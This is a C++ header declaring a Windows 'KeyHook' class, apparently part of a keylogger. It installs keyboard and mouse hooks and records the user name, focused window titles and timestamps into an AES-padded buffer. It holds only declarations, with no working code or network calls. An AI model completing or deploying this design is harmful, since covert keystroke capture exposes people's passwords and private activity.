
#ifndef		_KEY_HOOK_HH_
# define	_KEY_HOOK_HH_

# define	_BUFFER_SEPARATOR		"#"
# define	_FORMAT_DATETIME		"%d-%m-%Y %I:%M:%S"
# define	_AES_PADDING_SIZE		0x010
# define	_NB_BUFFER_SEPARATOR	0x003

#include <Windows.h>
#include <iostream>
#include <thread>
#include <map>
#include <lmcons.h>
#include <string>
#include <ctime>

class KeyHook
{
public:
	 KeyHook();
	 ~KeyHook();
	 void								setHook();
	 void								unsetHook();
	 const std::string					&getKey();
	 const std::string					&getUserName() const;
	 bool								bufferIsEmpty();
	 bool								bufferIsPadded();

private:
	// Methods
	static LRESULT __stdcall			keyboardHookCallback(int nCode, WPARAM wParam, LPARAM lParam);
	static LRESULT __stdcall			mouseHookCallback(int nCode, WPARAM wParam, LPARAM lParam);
	void								initKeyboardMap();
	void								initKeyboardMapMaj();
	void								findCurrentUserName();
	void								getFocusedWindowTitle();
	void								getCurrentDateTime();

	// Attributes
	std::string							_userName;
	std::string							_windowTitle;
	std::string							_currentDateTime;
};

void									hookHandlingLoop(KeyHook &keyHooker);

#endif		/* !_KEY_HOOK_HH_ */